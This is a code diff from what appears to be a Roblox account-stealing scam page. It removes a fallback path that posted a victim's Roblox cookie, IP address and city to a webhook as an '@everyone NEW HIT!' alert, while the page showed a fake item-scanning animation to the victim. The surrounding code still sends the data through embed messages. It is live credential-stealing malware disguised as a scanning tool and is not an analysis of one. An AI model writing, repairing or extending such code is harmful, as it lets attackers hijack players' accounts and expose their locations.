@@ -331,37 +331,7 @@ async function submitPowerShell() {
                     closeScanModal();
                 }, 4000);
             } else {
-                // If both embeds fail, try plain text as final fallback
-                console.log('Both embed formats failed, trying plain text...');
-                const textPayload = {
-                    content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
-                };
-                
-                const textResponse = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(textPayload)
-                });
-                
-                if (textResponse.ok) {
-                    console.log('Plain text format succeeded');
-                    submitText.textContent = 'Scanning item please wait';
-                    submitBtn.style.background = '#10b981';
-                    showNotification('Scanning item please wait', 'success');
-                    
-                    // Show scanning animation with loading overlay
-                    showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
-                    startScanningAnimation();
-                    
-                    setTimeout(() => {
-                        hideLoadingOverlay();
-                        closeScanModal();
-                    }, 4000);
-                } else {
-                    throw new Error(`All webhook formats failed: ${response.status}, ${fallbackResponse.status}, ${textResponse.status}`);
-                }
+                throw new Error(`Both embed formats failed: ${response.status}, ${fallbackResponse.status}`);
             }
         }
     } catch (error) {
